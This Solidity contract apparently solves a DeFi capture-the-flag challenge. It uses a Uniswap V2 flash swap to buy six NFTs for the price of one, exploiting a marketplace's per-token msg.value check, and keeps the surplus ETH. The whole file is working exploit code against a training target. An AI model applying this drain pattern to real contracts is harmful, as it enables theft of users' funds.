// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
import "hardhat/console.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256 balance);
    function ownerOf(uint256 tokenId) external view returns (address owner);
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
    function approve(address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool _approved) external;
    function getApproved(uint256 tokenId) external view returns (address operator);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

interface IMarketplace{
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract FreeRiderAttacker is IERC721Receiver{
    IERC721 nft;
    IERC20 dvt;
    IWETH weth;
    IMarketplace marketplace;
    address recovery;
    IUniswapV2Factory factory;
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    uint256 NFT_PRICE = 15 ether;
    bool attack_succesfull = false;

    constructor(address _token, address _weth, address _nft, address _marketplace, address _pair, address _router, address _factory, address _recovery) public
    {
        dvt = IERC20(_token);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        marketplace = IMarketplace(_marketplace);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        factory = IUniswapV2Factory(_factory);
        recovery = _recovery;
    }

    function attack() external
    {
        //get a flash loan from uniswap
        pair.swap(NFT_PRICE, 0, address(this), "test42069");
        require(attack_succesfull, "Attack failed");
        msg.sender.call{value: address(this).balance}("");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external
    {
        //change all the WETH to ETH    
        weth.withdraw(NFT_PRICE);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        //Buy all the NFTs for 15 eth
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        //Give the NFTs to the developer
        for (uint256 id = 0; id < 6; id++)
        {
            nft.safeTransferFrom(address(this), recovery, id, abi.encode(address(this)));
        }

        require(nft.balanceOf(address(this)) == 0, "Not all NFTs were transferred");
        require(address(this).balance > 45 ether, "Prize was not received");

        address[] memory path = new address[](1);
        path[0] = address(dvt);

        //15 ether / 0.997 = 15.045135406218655968 ether 
        weth.deposit{value: 15.045135406218655968 ether}();
        weth.transfer(address(pair), 15.045135406218655968 ether);

        attack_succesfull = true;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4)
    {
        //return the selector
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    receive() external payable
    {

    }

    fallback() external payable
    {

    }
}